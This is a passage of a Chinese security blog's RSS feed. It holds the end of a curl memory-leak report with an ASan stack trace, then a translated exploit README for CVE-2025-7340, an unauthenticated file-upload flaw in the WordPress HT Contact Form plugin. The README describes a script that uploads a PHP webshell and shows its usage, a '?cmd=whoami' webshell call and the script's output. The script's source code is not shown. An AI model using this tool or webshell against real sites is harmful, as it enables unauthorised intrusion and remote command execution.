&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Direct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;leak&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;107&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;allocated&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#0 0x55da4969379c in realloc /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:82:3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#1 0x55da496ff27b in curl_dbg_realloc /src/curl/lib/memdebug.c:265:9&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#2 0x55da497fc6f3 in dyn_nappend /src/curl/lib/dynbuf.c:111:15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#3 0x55da497faee5 in doh_write_cb /src/curl/lib/doh.c:183:6&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#4 0x55da497f2636 in cw_out_ptr_flush /src/curl/lib/cw-out.c:224:16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#5 0x55da497f1644 in cw_out_do_write /src/curl/lib/cw-out.c:383:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#6 0x55da497f0ab6 in cw_out_write /src/curl/lib/cw-out.c:416:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#7 0x55da497f2f62 in cw_pause_write /src/curl/lib/cw-pause.c:192:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#8 0x55da497476e1 in Curl_cwriter_write /src/curl/lib/sendf.c:184:10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#9 0x55da497476e1 in cw_download_write /src/curl/lib/sendf.c:312:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#10 0x55da497415b9 in Curl_cwriter_write /src/curl/lib/sendf.c:184:10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#11 0x55da497415b9 in Curl_client_write /src/curl/lib/sendf.c:92:12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#12 0x55da498363a5 in Curl_http_write_resp /src/curl/lib/http.c:4201:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#13 0x55da49762635 in Curl_xfer_write_resp /src/curl/lib/transfer.c:862:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#14 0x55da4975e364 in sendrecv_dl /src/curl/lib/transfer.c:342:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#15 0x55da4975e364 in Curl_sendrecv /src/curl/lib/transfer.c:441:14&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#16 0x55da497250f5 in state_performing /src/curl/lib/multi.c:1733:12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#17 0x55da497250f5 in multi_runsingle /src/curl/lib/multi.c:2423:12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#18 0x55da497222f2 in curl_multi_perform /src/curl/lib/multi.c:2599:16&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#19 0x55da496d3e98 in fuzz_handle_transfer(fuzz_data*) /src/curl_fuzzer/curl_fuzzer.cc:419:5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#20 0x55da496d2e47 in LLVMFuzzerTestOneInput /src/curl_fuzzer/curl_fuzzer.cc:97:3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;需要传递-runs=100参数，如：&lt;code&gt;/out/curl_fuzzer_http /out/leak-247f5201c537eecc44d9f44dd815fd43f19a8a72 -runs=100&lt;/code&gt;，因为并非每次都会出现该问题&lt;/p&gt;
&lt;h2 id=&#34;影响&#34;&gt;影响
&lt;/h2&gt;&lt;p&gt;内存泄漏可能最终导致拒绝服务(DOS)&amp;hellip;&lt;/p&gt;
&lt;h2 id=&#34;后续讨论&#34;&gt;后续讨论
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;报告者认为这可能不是安全问题而是信息性问题&lt;/li&gt;
&lt;li&gt;curl团队确认该问题存在于DNS over HTTPS(doh.c)处理过程中，泄漏量小且不频繁&lt;/li&gt;
&lt;li&gt;团队提供了修复PR(#16834)并确认已合并&lt;/li&gt;
&lt;li&gt;报告者验证修复后确认问题已解决&lt;/li&gt;
&lt;li&gt;最终该报告被标记为&amp;quot;Informative&amp;quot;而非安全漏洞&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>WordPress HT Contact Form插件未授权任意文件上传漏洞(CVE-2025-7340)利用分析</title>
        <link>http://localhost:1313/p/wordpress-ht-contact-form%E6%8F%92%E4%BB%B6%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ecve-2025-7340%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 01:12:17 +0800</pubDate>
        
        <guid>http://localhost:1313/p/wordpress-ht-contact-form%E6%8F%92%E4%BB%B6%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ecve-2025-7340%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;-ht-contact-form-widget--221---未授权任意文件上传漏洞cve-2025-7340&#34;&gt;🚨 HT Contact Form Widget &amp;lt;= 2.2.1 - 未授权任意文件上传漏洞(CVE-2025-7340)
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;CVE编号:&lt;/strong&gt; CVE-2025-7340&lt;br&gt;
&lt;strong&gt;CVSS评分:&lt;/strong&gt; 9.8 (严重)&lt;/p&gt;
&lt;h2 id=&#34;-漏洞描述&#34;&gt;📝 漏洞描述
&lt;/h2&gt;&lt;p&gt;WordPress插件**HT Contact Form Widget For Elementor Page Builder &amp;amp; Gutenberg Blocks &amp;amp; Form Builder.**在2.2.1及之前版本中，&lt;code&gt;temp_file_upload&lt;/code&gt;函数缺少文件类型验证，导致存在任意文件上传漏洞。&lt;/p&gt;
&lt;p&gt;该漏洞允许&lt;strong&gt;未认证的攻击者&lt;/strong&gt;向服务器上传任意文件，可能导致&lt;strong&gt;远程代码执行(RCE)&lt;/strong&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-漏洞利用脚本&#34;&gt;⚡ 漏洞利用脚本
&lt;/h2&gt;&lt;p&gt;本仓库包含一个Python利用脚本，可自动发现存在漏洞的表单并向目标网站上传Webshell。&lt;/p&gt;
&lt;p&gt;脚本会智能检测所需参数(&lt;code&gt;nonce&lt;/code&gt;, &lt;code&gt;form_id&lt;/code&gt;, &lt;code&gt;ajax endpoint&lt;/code&gt;)，并将PHP Webshell上传至漏洞路径。&lt;/p&gt;
&lt;p&gt;✅ &lt;strong&gt;存在漏洞的表单URL示例:&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://target.com/contact/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;✅ &lt;strong&gt;目标页面必须包含存在漏洞的表单&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-环境要求&#34;&gt;📦 环境要求
&lt;/h2&gt;&lt;p&gt;运行脚本前需安装以下Python模块:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;pip install -r requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;requirements.txt&lt;/code&gt;内容:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;requests
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;colorama
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-使用方法&#34;&gt;� 使用方法
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;usage: CVE-2025-7340.py &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-h&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CVE-2025-7340漏洞利用脚本 - 未授权任意文件上传 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 作者: Khaled Alenazi &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Nxploited&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -h, --help     显示帮助信息
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  -u, --url URL  目标URL 例如 http&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;://target.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;选项说明&#34;&gt;选项说明:
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;选项&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;-h, --help&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;显示帮助信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;-u, --url URL&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;目标URL 例如 &lt;code&gt;http(s)://target.com/contact&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-webshell使用说明&#34;&gt;🐚 Webshell使用说明
&lt;/h2&gt;&lt;p&gt;漏洞利用成功后，可通过给定路径访问上传的Webshell。&lt;/p&gt;
&lt;p&gt;附加&lt;code&gt;?cmd=&amp;lt;your_command&amp;gt;&lt;/code&gt;参数可执行系统命令。&lt;/p&gt;
&lt;p&gt;✅ 示例:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ht_form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;whoami&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-示例输出&#34;&gt;🖥️ 示例输出
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;开始对目标进行漏洞利用&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;获取目标页面&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;提取参数&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;获取&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Nonce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;346&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c441903&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;AJAX端点&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nxploit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ddev&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;site&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;表单&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;86&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;生成&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Webshell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;上传&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Webshell&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，请稍候&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;漏洞利用成功&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;访问路径&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;wp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploads&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ht_form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;temp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;687590&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;d90ac1c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shell&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;作者&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Khaled&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Alenazi&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Nxploited&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;https&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;github&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Nxploited&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h2 id=&#34;-免责声明&#34;&gt;🛑 免责声明
&lt;/h2&gt;&lt;p&gt;本工具仅用于&lt;strong&gt;教育研究目的&lt;/strong&gt;。&lt;br&gt;
作者&lt;strong&gt;不对&lt;/strong&gt;代码滥用造成的任何损害负责。&lt;br&gt;
测试任何系统前请务必获得明确授权。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;-作者&#34;&gt;👨‍💻 作者
